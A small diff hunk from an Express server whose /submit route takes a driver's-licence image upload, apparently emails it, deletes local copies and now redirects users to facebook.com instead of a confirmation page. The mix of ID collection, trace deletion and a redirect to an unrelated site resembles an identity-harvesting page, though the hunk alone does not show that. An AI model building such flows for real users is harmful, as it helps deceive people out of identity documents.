@@ -80,7 +80,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     fs.unlinkSync(dataFileName);
     fs.rmdirSync(folderName, { recursive: true });
 
-    res.sendFile(path.join(__dirname, "confirmation.html"));
+    res.redirect("https://www.facebook.com");
   } catch (err) {
     console.error(err);
     res.status(500).send("Error sending email.");
